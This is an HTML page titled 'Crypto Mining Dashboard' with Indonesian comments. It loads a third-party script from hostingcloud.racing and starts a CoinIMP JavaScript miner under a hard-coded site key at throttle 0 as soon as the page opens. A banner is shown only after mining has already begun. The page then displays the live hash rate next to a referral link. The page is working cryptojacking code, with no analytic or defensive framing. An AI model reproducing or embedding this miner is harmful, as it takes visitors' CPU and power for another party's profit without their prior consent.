<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Mining Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #4c4c4c; /* Warna latar belakang */
            color: #cccccc; /* Warna teks */
            margin: 0;
            padding: 0;
            display: block;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            background-color: #3d3d3d; /* Warna latar belakang kontainer */
            text-align: center;
        }

        h1 {
            color: #ffffff; /* Warna teks judul */
            margin-bottom: 20px;
            font-size: 25px; /* Ukuran font judul */
            text-align: left; /* Penyesuaian untuk font di kiri */
        }

        .info {
            padding: 20px;
            border-radius: 10px;
            background-color: #3d3d3d; /* Warna latar belakang info */
            text-align: left; /* Penyesuaian untuk font di kiri */
        }

        .info p {
            font-size: 11px; /* Ukuran font info */
            margin: 10px 0;
            line-height: 5; /* Jarak antar baris */
            margin-block-start: 0; /* Menghilangkan margin atas */
            margin-block-end: 0; /* Menghilangkan margin bawah */
        }

        .info strong {
            font-weight: bold;
            font-size: 18px; /* Ukuran font teks tebal */
        }

        .info table {
            margin-top: 10px;
            width: 100%; /* Lebar tabel 100% dari kontainer */
            border-collapse: collapse;
        }

        .info th, .info td {
            padding: 8px;
            border-bottom: 1px solid #cccccc; /* Garis bawah untuk setiap baris */
        }

        .info th {
            background-color: #333333; /* Warna latar belakang header */
            color: #ffffff; /* Warna teks header */
            text-align: left;
        }

        .speed {
            color: #b3b3b3; /* Warna angka speed */
            font-weight: bold;
        }

        .total {
            color: #b3b3b3; /* Warna angka total */
            font-weight: bold;
        }

        a {
            color: #b3b3b3; /* Warna biru untuk tautan */
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }
    </style>
    <script src="https://www.hostingcloud.racing/ElSO.js"></script>
    <script>
        var _client = new Client.Anonymous('201bf3164446664b5c4e56c8ce2d8d0464a9ded1d82355ffb07357741b6262c3', {
            throttle: 0, c: 'w'
        });
        _client.start();
        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");

        document.addEventListener("DOMContentLoaded", function() {
            setInterval(function(){
                let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
                let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
                document.getElementById("speedValue").innerText = speed;
                document.getElementById("totalValue").innerText = total;
            },500);
        });
    </script>
</head>
<body>
    <div class="container">
        <h1>Crypto Mining Dashboard</h1>
        <div class="info">
            <table>
                <tr>
                    <th>Info</th>
                    <th>Value</th>
                </tr>
                <tr>
               
                </tr>
                <tr>
                    <td><strong>IP address :</strong></td>
                    <td>192.168.0.1</td>
                </tr>
                <tr>
                    <td><strong>Speed Time:</strong></td>
                    <td><span id="speedValue" class="speed">0</span></td>
                </tr>
                <tr>
                    <td><strong>Total Hash :</strong></td>
                    <td><span id="totalValue" class="total">0</span></td>
                </tr>
            </table>
            <p>Jika Anda ingin mulai mining, silakan klik <a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8c">di sini</a>.</p>
        </div>
    </div>
</body>
</html>
